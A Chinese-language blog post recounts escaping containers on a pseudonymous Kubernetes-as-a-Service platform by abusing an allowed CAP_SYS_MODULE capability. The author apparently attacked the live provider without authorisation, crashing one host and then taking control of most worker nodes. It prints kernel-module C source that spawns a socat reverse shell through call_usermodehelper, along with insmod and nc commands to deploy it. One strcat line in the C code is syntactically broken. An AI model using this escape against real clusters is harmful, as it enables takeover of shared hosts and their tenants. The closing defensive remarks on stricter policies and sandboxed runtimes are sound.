&nbsp; &nbsp; &nbsp; &nbsp;本文谨记一次container escape，文中出现的服务提供商名称为化名（估计他们还没修洞呢）TL;DR：container不是sandbox，运行不可信container最好增加安全措施。

&nbsp; &nbsp; &nbsp; &nbsp;前些时日找到了一个Kuberntes as a Service平台 - ekoott，为用户提供隔离的namespace运行任意manifest，这样的平台现在似乎还挺多的，不过这家给的quota比较多，我将大部分non-critical的服务迁移上了他们的集群。同时群友JerryXiao想到了使用PersistentVolume来运行一个chroot的Arch，变相将container当vps用的操作。（PV挂载选项有nosuid，故而他又使用ssh模拟了一个sudo，效果拔群）

&nbsp; &nbsp; &nbsp; &nbsp;得 寸 进 尺，JerryXIao又提出了在container里跑wireguard的想法，使用usermode linux配合slirp，强行套娃。这一方案虽然可以使用，但是年久失修的slirp难以编译~~需要C98~~。虽然不报太大希望，我尝试了在Pod的securityContext中添加privileged，毫无疑问，失败了，但是我们还有capabilities可以尝试。~~CAP_SYS_ADMIN~~ CAP_NET_ADMIN居然被PodSecurityPolicy允许了，那意味着我们已经可以使用usermode的wireguard了。手动二分发现，我还可以获得的cap有：CAP_SYS_MODULE，Load and unload kernel modules！~~很好那我把所有的module unload掉好了~~，初步的尝试就构成了DoS，干掉了一台宿主机。这一cap能干的还有load module，这为我们的container escape带来了可能，[How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://www.cyberark.com/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host/)一文中描述了一种攻击手段，利用kernel module调用usermode helper，以获得宿主机上的reverse shell。文中的攻击较为复杂，涉及到探测内核的*vermagic*等，我们直接uname -a然后去ubuntu那里偷了几个header包。随后便是模块的构造了，初步的探测发现宿主机上有socat，极大方便了reverse shell的建立：

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched/signal.h>
#include <linux/nsproxy.h>
#include <linux/proc_ns.h>

MODULE_LICENSE("GPL");

static char *host = "";

module_param(host, charp, 0000);
MODULE_PARM_DESC(host, "");

static int __init escape_start(void)
{
    static char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    char *argv[] = { "/usr/bin/socat", "exec:/bin/bash -li,pty,stderr,setsid,sigint,sane", strcat(host,",forever", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

module_init(escape_start);
```

之后我们编写了如下的自动化提权，构建容器后建立Deployment，掌握了几乎所有worker的控制权。

```bash
insmod /root/nsescape.ko $(ip -br a s dev eth0 | awk '{ print $3 }' | sed "s/\/.*/:1080,forever/;s/^/host=tcp:/")
nc -l -p 1080
```

ekoott使用的k8s distro是GKE，查阅[文档](https://cloud.google.com/kubernetes-engine/docs/how-to/pod-security-policies)发现PodSecurityPolicy尚在**Beta**阶段，看来ekoott已经做出了保护自己的基础设施的努力，但是很遗憾的失败了。container不是sandbox，随着这样的KaaS平台的增多，越来越多的infra将面临来自不可信的容器的挑战。这次ekoott所暴露的漏洞是human error，更加严格的PodSecurityPolicy本可以避免这一切，但是由宿主和容器共用的内核其实是一个更大的攻击面，或许[gvisor](https://gvisor.dev/)这样以安全为首要目的容器运行时能缓解一些vulnerability，但是defense-in-depth将会是永远的话题。